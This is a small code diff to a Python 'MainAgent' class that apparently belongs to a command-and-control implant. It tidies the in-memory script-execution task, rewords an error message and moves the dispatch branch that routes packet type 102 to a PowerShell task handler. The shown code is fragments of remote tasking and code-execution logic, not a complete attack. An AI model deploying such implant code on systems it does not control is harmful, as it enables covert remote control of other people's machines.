@@ -1168,7 +1168,6 @@ class MainAgent:
         Task 112
         """
         try:
-            result = "[*] Executing script in-memory...\n"
             script_globals = {}
             output_capture = io.StringIO()
             sys.stdout = output_capture
@@ -1191,13 +1190,12 @@ class MainAgent:
                 self.tasks[result_id]["status"] = "error"
                 return
 
-            result += "[*] Script execution completed successfully.\n"
             captured_output = output_capture.getvalue()
 
             if captured_output:
-                result += "[*] Output from script:\n" + captured_output
+                result = "[*] Output from script:\n" + captured_output
             else:
-                result += "[*] No output captured from the script.\n"
+                result = "[*] No output captured from the script.\n"
 
             if 'output' in script_globals:
                 result += "[*] Output variable from script: \n" + str(script_globals['output'])
@@ -1216,7 +1214,6 @@ class MainAgent:
             self.tasks[result_id]["status"] = "error"
 
         finally:
-            # Restore the original stdout after execution
             sys.stdout = sys.__stdout__
 
     def powershell_task(self, data, result_id):
@@ -1362,7 +1359,7 @@ class MainAgent:
         try:
             self.job_message_buffer += str(message)
         except Exception as e:
-            print(e)
+            print("[!] Error adding job output to buffer: %s" % (e))
 
     def get_job_message_buffer(self):
         try:
@@ -1700,6 +1697,9 @@ class MainAgent:
             elif packet_type == 101:
                 self.tasks[result_id]["status"] = "unimplemented"
 
+            elif packet_type == 102:
+                self.powershell_task(data, result_id)
+
             elif packet_type == 110:
                 self.dynamic_code_execute_wait_nosave(data, result_id)
 
@@ -1711,9 +1711,6 @@ class MainAgent:
 
             elif packet_type == 113:
                 self.start_python_job(data, result_id)
-
-            elif packet_type == 102:
-                self.powershell_task(data, result_id)
 
             elif packet_type == 120:
                 self.csharp_execute_wait(data, result_id)
